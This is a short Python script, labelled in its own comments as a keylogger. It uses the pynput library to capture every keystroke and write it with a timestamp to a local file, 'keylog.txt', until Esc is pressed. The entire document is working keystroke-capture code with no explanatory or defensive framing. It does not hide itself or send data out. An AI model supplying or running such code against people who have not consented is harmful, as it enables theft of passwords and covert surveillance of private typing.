import logging
from pynput import keyboard

# Setting up the logging configuration
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Starting the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
